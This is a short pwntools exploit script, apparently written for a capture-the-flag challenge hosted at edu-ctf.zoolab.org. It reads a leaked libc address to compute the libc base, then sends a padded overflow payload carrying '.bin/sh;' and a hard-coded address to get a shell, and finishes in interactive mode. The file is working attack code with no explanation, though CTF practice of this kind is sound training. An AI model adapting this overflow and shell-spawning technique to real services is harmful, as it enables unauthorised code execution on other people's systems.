from pwn import *

'''
rbp = buffer + 0x28 ~ 0x30
0x5c5e90 <PyObject_RichCompare+480> mov    r14, QWORD PTR [rbp+0xc8]
'''

#r = remote('0.0.0.0',10013)
r = remote('edu-ctf.zoolab.org',10013)
# = process(['python3','-B','./chal'])

r.recvuntil(b'[Gift ')
libc_base = int(r.recv(14),16) - 0x83970
print(hex(libc_base))

g = cyclic_gen()
input()
#r.sendlineafter(b"What's your name ?",b';'*0x1f + b'a' + b'.bin/sh;'  + p64(0x8f9298)) # 0x8f7360 remote 0x8f7298
r.sendlineafter(b"What's your name ?",b';'*0x20 + b'.bin/sh;' + p64(0x8f7298))

r.interactive()
